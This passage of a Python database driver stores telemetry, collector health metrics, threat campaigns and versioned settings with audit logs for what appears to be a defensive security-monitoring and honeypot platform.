    def get_collector_health_metrics(self, source_mode: str = "LIVE") -> Dict[str, Dict[str, Any]]:
        conn = self.get_connection()
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()

        import platform
        is_win = platform.system() == "Windows"

        collectors_def = {
            "windows_event_log": {
                "name": "Win Event Log",
                "sources": "('WinEventLogCollector', 'windows', 'event_log')",
                "type": "'windows_event'",
                "base_status": "AVAILABLE" if is_win else "UNAVAILABLE"
            },
            "process": {
                "name": "Process Collector",
                "sources": "('ProcessCollector', 'process')",
                "type": "'process'",
                "base_status": "AVAILABLE"
            },
            "network": {
                "name": "Network Collector",
                "sources": "('NetworkCollector', 'network')",
                "type": "'network'",
                "base_status": "AVAILABLE"
            },
            "dns": {
                "name": "DNS Collector",
                "sources": "('DNSCollector', 'DnsCollector', 'dns')",
                "type": "'dns'",
                "base_status": "UNAVAILABLE"
            },
            "powershell": {
                "name": "PowerShell Monitor",
                "sources": "('PowerShellCollector', 'powershell')",
                "type": "'powershell'",
                "base_status": "AVAILABLE" if is_win else "UNAVAILABLE"
            },
            "sysmon": {
                "name": "Sysmon Provenance",
                "sources": "('SysmonCollector', 'sysmon')",
                "type": "'sysmon'",
                "base_status": "NOT_INSTALLED"
            }
        }

        if is_win:
            try:
                import psutil
                if hasattr(psutil, "win_service_iter"):
                    for s in psutil.win_service_iter():
                        if s.name().lower() in ['sysmon', 'sysmon64']:
                            collectors_def["sysmon"]["base_status"] = "ACTIVE" if s.status() == 'running' else "AVAILABLE"
                            break
            except Exception:
                pass

        results = {}
        now_dt = datetime.now(timezone.utc)
        # 10-second rolling EPS calculation window
        cutoff_dt = datetime.fromtimestamp(now_dt.timestamp() - 10, tz=timezone.utc)
        cutoff_str = cutoff_dt.isoformat()

        for c_key, c_info in collectors_def.items():
            base_status = c_info["base_status"]
            sources_clause = c_info["sources"]
            type_val = c_info["type"]

            query_total = f"""
                SELECT COUNT(*), MAX(timestamp) 
                FROM telemetry_events 
                WHERE source_mode = ? AND (source IN {sources_clause} OR event_type = {type_val})
            """
            cursor.execute(query_total, (source_mode,))
            row = cursor.fetchone()
            total_cnt = row[0] or 0
            max_ts = row[1] if row[1] else "Never"

            query_eps = f"""
                SELECT COUNT(*) 
                FROM telemetry_events 
                WHERE source_mode = ? AND (source IN {sources_clause} OR event_type = {type_val}) AND timestamp >= ?
            """
            cursor.execute(query_eps, (source_mode, cutoff_str))
            window_cnt = cursor.fetchone()[0] or 0
            eps = round(window_cnt / 10.0, 2)

            status = base_status
            if base_status not in ["NOT_INSTALLED", "UNAVAILABLE"]:
                if total_cnt > 0 or window_cnt > 0 or max_ts != "Never":
                    status = "ACTIVE"
                else:
                    status = "AVAILABLE"

            results[c_key] = {
                "collector": c_key,
                "name": c_info["name"],
                "status": status,
                "last_event": max_ts,
                "events_per_sec": eps,
                "errors": 0,
                "dropped_events": 0,
                "total_events": total_cnt
            }

        conn.close()
        return results

    def save_campaign(self, c_dict: Dict[str, Any]):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO campaigns VALUES (
                ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?
            )
        ''', (
            c_dict.get("campaign_id"),
            c_dict.get("campaign_name"),
            c_dict.get("campaign_type", "BEHAVIORAL"),
            c_dict.get("status", "ACTIVE"),
            c_dict.get("first_seen"),
            c_dict.get("last_seen"),
            c_dict.get("source_mode", "LIVE"),
            float(c_dict.get("confidence", 0.8)),
            c_dict.get("severity", "HIGH"),
            json.dumps(c_dict.get("attribution", {})),
            json.dumps(c_dict.get("evidence_event_ids", [])),
            json.dumps(c_dict.get("attack_session_ids", [])),
            json.dumps(c_dict.get("ioc_ids", [])),
            json.dumps(c_dict.get("technique_ids", [])),
            json.dumps(c_dict.get("source_ips", [])),
            json.dumps(c_dict.get("destination_ips", [])),
            json.dumps(c_dict.get("target_ports", [])),
            json.dumps(c_dict.get("honeypots", [])),
            json.dumps(c_dict.get("hosts", [])),
            json.dumps(c_dict.get("behavior_fingerprint", {})),
            c_dict.get("campaign_stage", "INITIAL_ACCESS"),
            json.dumps(c_dict.get("observed_stages", [])),
            c_dict.get("mapping_type", "INFERRED"),
            c_dict.get("analyst_status", "UNVALIDATED"),
            json.dumps(c_dict.get("confidence_reasons", [])),
            json.dumps(c_dict.get("severity_reasons", [])),
            json.dumps(c_dict.get("audit_trail", []))
        ))
        conn.commit()
        conn.close()

    def get_campaigns(self, source_mode: str = "LIVE", status: Optional[str] = None, severity: Optional[str] = None, analyst_status: Optional[str] = None, search: Optional[str] = None) -> List[Dict[str, Any]]:
        conn = self.get_connection()
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()

        query = "SELECT * FROM campaigns WHERE source_mode = ?"
        params = [source_mode]

        if status:
            query += " AND status = ?"
            params.append(status)
        if severity:
            query += " AND severity = ?"
            params.append(severity)
        if analyst_status:
            query += " AND analyst_status = ?"
            params.append(analyst_status)
        if search:
            query += " AND (campaign_id LIKE ? OR campaign_name LIKE ? OR technique_ids LIKE ? OR source_ips LIKE ?)"
            s = f"%{search}%"
            params.extend([s, s, s, s])

        query += " ORDER BY last_seen DESC"
        cursor.execute(query, params)
        rows = cursor.fetchall()
        conn.close()

        results = []
        for r in rows:
            rd = dict(r)
            for k in ["attribution", "behavior_fingerprint"]:
                if rd.get(k):
                    try: rd[k] = json.loads(rd[k])
                    except Exception: pass
            for k in ["evidence_event_ids", "attack_session_ids", "ioc_ids", "technique_ids", "source_ips", "destination_ips", "target_ports", "honeypots", "hosts", "observed_stages", "confidence_reasons", "severity_reasons", "audit_trail"]:
                if rd.get(k):
                    try: rd[k] = json.loads(rd[k])
                    except Exception: rd[k] = []
            results.append(rd)

        return results

    def get_campaign_by_id(self, campaign_id: str) -> Optional[Dict[str, Any]]:
        conn = self.get_connection()
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM campaigns WHERE campaign_id = ?", (campaign_id,))
        r = cursor.fetchone()
        conn.close()
        if not r:
            return None
        rd = dict(r)
        for k in ["attribution", "behavior_fingerprint"]:
            if rd.get(k):
                try: rd[k] = json.loads(rd[k])
                except Exception: pass
        for k in ["evidence_event_ids", "attack_session_ids", "ioc_ids", "technique_ids", "source_ips", "destination_ips", "target_ports", "honeypots", "hosts", "observed_stages", "confidence_reasons", "severity_reasons", "audit_trail"]:
            if rd.get(k):
                try: rd[k] = json.loads(rd[k])
                except Exception: rd[k] = []
        return rd

    def update_campaign_analyst_status(self, campaign_id: str, analyst_status: str, actor: str = "Analyst", notes: str = "") -> Optional[Dict[str, Any]]:
        camp = self.get_campaign_by_id(campaign_id)
        if not camp:
            return None

        camp["analyst_status"] = analyst_status
        audit = camp.get("audit_trail") or []
        audit.append({
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "action": f"ANALYST_{analyst_status.upper()}",
            "actor": actor,
            "notes": notes or f"Analyst changed validation status to {analyst_status}"
        })
        camp["audit_trail"] = audit
        self.save_campaign(camp)
        return camp

    def get_campaign_stats(self, source_mode: str = "LIVE") -> Dict[str, Any]:
        camps = self.get_campaigns(source_mode=source_mode)
        active = len([c for c in camps if c.get("status") in ["ACTIVE", "CANDIDATE"]])
        candidates = len([c for c in camps if c.get("status") == "CANDIDATE"])
        unknown = len([c for c in camps if (c.get("attribution") or {}).get("type") == "UNKNOWN"])
        validated = len([c for c in camps if c.get("analyst_status") == "VALIDATED"])
        high_risk = len([c for c in camps if c.get("severity") in ["HIGH", "CRITICAL"]])
        sessions = sum(len(c.get("attack_session_ids", [])) for c in camps)

        return {
            "active_campaigns": active,
            "candidates": candidates,
            "unknown_campaigns": unknown,
            "validated_campaigns": validated,
            "high_risk_campaigns": high_risk,
            "correlated_sessions": sessions,
            "total_campaigns": len(camps)
        }

    # =========================================================================
    # Central Configuration & Settings Storage Engine
    # =========================================================================
    def get_all_settings(self) -> Dict[str, Any]:
        """Returns all persistent system configuration settings."""
        conn = self.get_connection()
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM system_settings")
        rows = cursor.fetchall()
        conn.close()
        
        settings = {}
        for r in rows:
            rd = dict(r)
            val = rd.get("value")
            stype = rd.get("type", "string")
            # Parse JSON value if needed
            if stype in ["json", "list", "dict"] and val:
                try: val = json.loads(val)
                except Exception: pass
            elif stype == "int" and val is not None:
                try: val = int(val)
                except Exception: pass
            elif stype == "float" and val is not None:
                try: val = float(val)
                except Exception: pass
            elif stype == "bool" and val is not None:
                val = str(val).lower() in ["true", "1", "yes"]
            
            rd["parsed_value"] = val
            settings[rd["key"]] = rd
        return settings

    def get_setting(self, key: str, default: Any = None) -> Any:
        """Fetches a single setting by key with fallback default."""
        conn = self.get_connection()
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM system_settings WHERE key = ?", (key,))
        r = cursor.fetchone()
        conn.close()
        if not r:
            return default
        
        rd = dict(r)
        val = rd.get("value")
        stype = rd.get("type", "string")
        if stype in ["json", "list", "dict"] and val:
            try: return json.loads(val)
            except Exception: return default
        elif stype == "int" and val is not None:
            try: return int(val)
            except Exception: return default
        elif stype == "float" and val is not None:
            try: return float(val)
            except Exception: return default
        elif stype == "bool" and val is not None:
            return str(val).lower() in ["true", "1", "yes"]
        return val

    def set_setting(self, key: str, value: Any, type_hint: Optional[str] = None, 
                    module: str = "general", scope: str = "global", 
                    requires_restart: int = 0, actor: str = "SYSTEM", 
                    reason: str = "", ip_address: str = "127.0.0.1") -> Dict[str, Any]:
        """Sets or updates a single setting, records version and writes audit log."""
        conn = self.get_connection()
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        # Check old value
        cursor.execute("SELECT * FROM system_settings WHERE key = ?", (key,))
        existing = cursor.fetchone()
        old_val_raw = None
        old_version = 0
        if existing:
            old_val_raw = existing["value"]
            old_version = existing["version"] or 1
            if not type_hint:
                type_hint = existing["type"]
            if module == "general" and existing["module"]:
                module = existing["module"]

        # Deduce type if not provided
        if not type_hint:
            if isinstance(value, bool): type_hint = "bool"
            elif isinstance(value, int): type_hint = "int"
            elif isinstance(value, float): type_hint = "float"
            elif isinstance(value, (dict, list)): type_hint = "json"
            else: type_hint = "string"

        # Serialize value for DB
        if type_hint == "json" or isinstance(value, (dict, list)):
            val_str = json.dumps(value)
        elif type_hint == "bool":
            val_str = "true" if value else "false"
        else:
            val_str = str(value)

        now_str = datetime.now(timezone.utc).isoformat()
        new_version = old_version + 1

        cursor.execute('''
            INSERT INTO system_settings (key, value, type, module, scope, requires_restart, updated_by, updated_at, version)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ON CONFLICT(key) DO UPDATE SET
                value = excluded.value,
                type = excluded.type,
                module = excluded.module,
                scope = excluded.scope,
                requires_restart = excluded.requires_restart,
                updated_by = excluded.updated_by,
                updated_at = excluded.updated_at,
                version = excluded.version
        ''', (key, val_str, type_hint, module, scope, requires_restart, actor, now_str, new_version))

        # Record audit log if value changed
        if old_val_raw != val_str:
            cursor.execute('''
                INSERT INTO settings_audit_log (timestamp, actor, module, setting_key, old_value, new_value, reason, result, ip_address)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (now_str, actor, module, key, old_val_raw, val_str, reason or "Configuration Updated", "SUCCESS", ip_address))

        conn.commit()
        conn.close()

        return {
            "key": key,
            "value": value,
            "type": type_hint,
            "module": module,
            "requires_restart": bool(requires_restart),
            "version": new_version,
            "updated_at": now_str,
            "updated_by": actor
        }

    def set_bulk_settings(self, settings_dict: Dict[str, Any], actor: str = "SYSTEM", 
                          reason: str = "", ip_address: str = "127.0.0.1") -> Dict[str, Any]:
        """Atomically saves multiple settings and returns results."""
        results = {}
        for key, item in settings_dict.items():
            if isinstance(item, dict) and "value" in item:
                val = item["value"]
                stype = item.get("type")
                mod = item.get("module", "general")
                scope = item.get("scope", "global")
                req_res = 1 if item.get("requires_restart") else 0
            else:
                val = item
                stype = None
                mod = "general"
                scope = "global"
                req_res = 0
            
            res = self.set_setting(
                key=key,
                value=val,
                type_hint=stype,
                module=mod,
                scope=scope,
                requires_restart=req_res,
                actor=actor,
                reason=reason,
                ip_address=ip_address
            )
            results[key] = res
        return results

    def reset_settings(self, module: Optional[str] = None, actor: str = "SYSTEM", reason: str = "Reset to factory defaults") -> int:
        """Resets settings for a module or entirely."""
        conn = self.get_connection()
        cursor = conn.cursor()
        now_str = datetime.now(timezone.utc).isoformat()
        
        if module:
            cursor.execute("SELECT key, value FROM system_settings WHERE module = ?", (module,))
            rows = cursor.fetchall()
            for r in rows:
                cursor.execute('''
                    INSERT INTO settings_audit_log (timestamp, actor, module, setting_key, old_value, new_value, reason, result, ip_address)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (now_str, actor, module, r[0], r[1], None, reason, "SUCCESS", "127.0.0.1"))
            cursor.execute("DELETE FROM system_settings WHERE module = ?", (module,))
        else:
            cursor.execute("SELECT key, module, value FROM system_settings")
            rows = cursor.fetchall()
            for r in rows:
                cursor.execute('''
                    INSERT INTO settings_audit_log (timestamp, actor, module, setting_key, old_value, new_value, reason, result, ip_address)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (now_str, actor, r[1], r[0], r[2], None, reason, "SUCCESS", "127.0.0.1"))
            cursor.execute("DELETE FROM system_settings")
            
        deleted_cnt = cursor.rowcount
        conn.commit()
        conn.close()
        return deleted_cnt

    def get_settings_audit_log(self, limit: int = 100, offset: int = 0, module: Optional[str] = None) -> List[Dict[str, Any]]:
        """Returns paginated change history records."""
        conn = self.get_connection()
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        query = "SELECT * FROM settings_audit_log WHERE 1=1"
        params = []
        if module:
            query += " AND module = ?"
            params.append(module)
        query += " ORDER BY id DESC LIMIT ? OFFSET ?"
        params.extend([limit, offset])
        
        cursor.execute(query, params)
        rows = cursor.fetchall()
        conn.close()
        return [dict(r) for r in rows]

    def record_settings_audit(self, actor: str, module: str, setting_key: str, 
                              old_value: Any, new_value: Any, reason: str, 
                              result: str = "SUCCESS", ip_address: str = "127.0.0.1"):
        """Records an explicit settings audit entry."""
        conn = self.get_connection()
        cursor = conn.cursor()
        now_str = datetime.now(timezone.utc).isoformat()
        cursor.execute('''
            INSERT INTO settings_audit_log (timestamp, actor, module, setting_key, old_value, new_value, reason, result, ip_address)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (now_str, actor, module, setting_key, str(old_value) if old_value is not None else None, 
              str(new_value) if new_value is not None else None, reason, result, ip_address))
        conn.commit()
        conn.close()


class TimescaleDBDriver(DatabaseDriver):
    """TimescaleDB / PostgreSQL Driver for Enterprise Scale."""
    def __init__(self, connection_string: Optional[str] = None):
        self.connection_string = connection_string or os.environ.get("TIMESCALE_CONN_STR")
        self.fallback = SQLiteDriver()

    def init_db(self):
        if not self.connection_string:
            return self.fallback.init_db()
        # High frequency time-series table creation in TimescaleDB
        pass

    def save_profile(self, *args, **kwargs):
        if not self.connection_string:
            return self.fallback.save_profile(*args, **kwargs)

    def get_history(self, limit=50):
        if not self.connection_string:
            return self.fallback.get_history(limit)

    def get_profile_by_id(self, profile_id):
        if not self.connection_string:
            return self.fallback.get_profile_by_id(profile_id)

    def save_tpot_alert(self, *args, **kwargs):
        if not self.connection_string:
            return self.fallback.save_tpot_alert(*args, **kwargs)

    def get_tpot_alerts(self):
        if not self.connection_string:
            return self.fallback.get_tpot_alerts()

    def update_tpot_alert_status(self, *args, **kwargs):
        if not self.connection_string:
            return self.fallback.update_tpot_alert_status(*args, **kwargs)

    def save_blocked_ip(self, *args, **kwargs):
        if not self.connection_string:
            return self.fallback.save_blocked_ip(*args, **kwargs)

    def get_blocked_ips(self):
        if not self.connection_string:
            return self.fallback.get_blocked_ips()

    def update_blocked_ip_status(self, *args, **kwargs):
        if not self.connection_string:
            return self.fallback.update_blocked_ip_status(*args, **kwargs)

    def save_telemetry_event(self, *args, **kwargs):
        if not self.connection_string:
            return self.fallback.save_telemetry_event(*args, **kwargs)

    def get_telemetry_events(self, *args, **kwargs):
        if not self.connection_string:
            return self.fallback.get_telemetry_events(*args, **kwargs)

    def get_telemetry_event_by_id(self, *args, **kwargs):
        if not self.connection_string:
            return self.fallback.get_telemetry_event_by_id(*args, **kwargs)

    def get_telemetry_stats(self, *args, **kwargs):
        if not self.connection_string:
            return self.fallback.get_telemetry_stats(*args, **kwargs)

    def get_collector_health_metrics(self, *args, **kwargs):
        if not self.connection_string:
            return self.fallback.get_collector_health_metrics(*args, **kwargs)

    def save_campaign(self, *args, **kwargs):
        if not self.connection_string:
            return self.fallback.save_campaign(*args, **kwargs)

    def get_campaigns(self, *args, **kwargs):
        if not self.connection_string:
            return self.fallback.get_campaigns(*args, **kwargs)

    def get_campaign_by_id(self, *args, **kwargs):
        if not self.connection_string:
            return self.fallback.get_campaign_by_id(*args, **kwargs)

    def update_campaign_analyst_status(self, *args, **kwargs):
        if not self.connection_string:
            return self.fallback.update_campaign_analyst_status(*args, **kwargs)

    def get_campaign_stats(self, *args, **kwargs):
        if not self.connection_string:
            return self.fallback.get_campaign_stats(*args, **kwargs)


# Vector DB Interface for d-BEF Embeddings
class VectorDBDriver:
    """FAISS / Qdrant Vector Index interface for sub-millisecond BSF/NSF similarity search."""
    def __init__(self, vector_dim: int = 128):
        self.vector_dim = vector_dim
        self.vectors = []
        self.ids = []

    def add_embedding(self, embedding_id: str, vector):
        self.ids.append(embedding_id)
        self.vectors.append(vector)

    def search_similar(self, query_vector, top_k: int = 5):
        if not self.vectors: return []
        import numpy as np
        vecs = np.array(self.vectors)
        q = np.array(query_vector)
        sims = np.dot(vecs, q) / (np.linalg.norm(vecs, axis=1) * np.linalg.norm(q) + 1e-9)
        top_indices = np.argsort(sims)[::-1][:top_k]
        return [(self.ids[idx], float(sims[idx])) for idx in top_indices]


# Global Active Database Instance
_ACTIVE_DB = SQLiteDriver()

def get_db_driver() -> DatabaseDriver:
    return _ACTIVE_DB

def get_db_connection(): return _ACTIVE_DB.get_connection()
def init_db(): return _ACTIVE_DB.init_db()
def save_profile(*args, **kwargs): return _ACTIVE_DB.save_profile(*args, **kwargs)
def get_history(*args, **kwargs): return _ACTIVE_DB.get_history(*args, **kwargs)
def get_profile_by_id(*args, **kwargs): return _ACTIVE_DB.get_profile_by_id(*args, **kwargs)
def save_tpot_alert(*args, **kwargs): return _ACTIVE_DB.save_tpot_alert(*args, **kwargs)
def get_tpot_alerts(): return _ACTIVE_DB.get_tpot_alerts()
def update_tpot_alert_status(*args, **kwargs): return _ACTIVE_DB.update_tpot_alert_status(*args, **kwargs)
def save_blocked_ip(*args, **kwargs): return _ACTIVE_DB.save_blocked_ip(*args, **kwargs)
def get_blocked_ips(): return _ACTIVE_DB.get_blocked_ips()
def update_blocked_ip_status(*args, **kwargs): return _ACTIVE_DB.update_blocked_ip_status(*args, **kwargs)
def save_behavior_pattern(*args, **kwargs): return _ACTIVE_DB.save_behavior_pattern(*args, **kwargs)
def get_behavior_patterns(*args, **kwargs): return _ACTIVE_DB.get_behavior_patterns(*args, **kwargs)
def get_behavior_pattern_by_id(*args, **kwargs): return _ACTIVE_DB.get_behavior_pattern_by_id(*args, **kwargs)
def get_pattern_by_fingerprint(*args, **kwargs): return _ACTIVE_DB.get_pattern_by_fingerprint(*args, **kwargs)
def record_pattern_feedback(*args, **kwargs): return _ACTIVE_DB.record_pattern_feedback(*args, **kwargs)
def get_pattern_audit_history(*args, **kwargs): return _ACTIVE_DB.get_pattern_audit_history(*args, **kwargs)
def get_tpot_sessions(*args, **kwargs): return _ACTIVE_DB.get_tpot_sessions(*args, **kwargs)
def get_tpot_sensors(*args, **kwargs): return _ACTIVE_DB.get_tpot_sensors(*args, **kwargs)
def save_telemetry_event(*args, **kwargs): return _ACTIVE_DB.save_telemetry_event(*args, **kwargs)
def get_telemetry_events(*args, **kwargs): return _ACTIVE_DB.get_telemetry_events(*args, **kwargs)
def get_telemetry_event_by_id(*args, **kwargs): return _ACTIVE_DB.get_telemetry_event_by_id(*args, **kwargs)
def get_telemetry_stats(*args, **kwargs): return _ACTIVE_DB.get_telemetry_stats(*args, **kwargs)
def get_collector_health_metrics(*args, **kwargs): return _ACTIVE_DB.get_collector_health_metrics(*args, **kwargs)
def save_campaign(*args, **kwargs): return _ACTIVE_DB.save_campaign(*args, **kwargs)
def get_campaigns(*args, **kwargs): return _ACTIVE_DB.get_campaigns(*args, **kwargs)
def get_campaign_by_id(*args, **kwargs): return _ACTIVE_DB.get_campaign_by_id(*args, **kwargs)
def update_campaign_analyst_status(*args, **kwargs): return _ACTIVE_DB.update_campaign_analyst_status(*args, **kwargs)
def get_campaign_stats(*args, **kwargs): return _ACTIVE_DB.get_campaign_stats(*args, **kwargs)
def save_playbook_audit(*args, **kwargs): return _ACTIVE_DB.save_playbook_audit(*args, **kwargs)
def get_playbook_audit_logs(*args, **kwargs): return _ACTIVE_DB.get_playbook_audit_logs(*args, **kwargs)
def get_all_settings(): return _ACTIVE_DB.get_all_settings()
def get_setting(*args, **kwargs): return _ACTIVE_DB.get_setting(*args, **kwargs)
def set_setting(*args, **kwargs): return _ACTIVE_DB.set_setting(*args, **kwargs)
def set_bulk_settings(*args, **kwargs): return _ACTIVE_DB.set_bulk_settings(*args, **kwargs)
def reset_settings(*args, **kwargs): return _ACTIVE_DB.reset_settings(*args, **kwargs)
def get_settings_audit_log(*args, **kwargs): return _ACTIVE_DB.get_settings_audit_log(*args, **kwargs)
def record_settings_audit(*args, **kwargs): return _ACTIVE_DB.record_settings_audit(*args, **kwargs)


if __name__ == "__main__":
    init_db()
    print("[+] Database driver initialized cleanly.")
